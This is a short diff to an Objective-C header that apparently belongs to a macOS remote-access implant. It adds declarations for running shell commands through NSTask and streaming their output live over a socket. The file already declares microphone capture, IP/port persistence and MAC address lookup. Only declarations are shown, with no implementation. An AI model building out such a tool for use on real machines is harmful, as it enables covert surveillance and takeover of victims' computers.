@@ -16,7 +16,8 @@
 @property (retain) NSFileManager *fileManager;
 @property (retain) NSString *skey;
 @property (retain) NSString *terminator;
-
+@property (retain) NSString *liveterminator;
+@property (nonatomic,strong) NSTask *systask;
 
 //convenience
 -(void)blank;
@@ -29,6 +30,7 @@ extern int sockfd;
              :(long)port;
 -(void)sendData:(NSData *)data;
 -(void)sendString:(NSString *)string;
+-(void)livesendString:(NSString *)string;
 
 //mic
 -(void)mic:(NSArray *)args;
@@ -64,6 +66,8 @@ extern int sockfd;
 -(void)persistence:(NSString *)ip :(NSString *)port;
 -(void)removePersistence:(NSString *)ip :(NSString *)port;
 -(void)openURL:(NSArray *)cmdarray;
+-(void)runtask:(NSString *)cmd;
+-(void)receivedData:(NSNotification *)notif;
 -(NSData *)GetMACAddress;
 -(NSString *)GetMACAddressDisplayString;
 
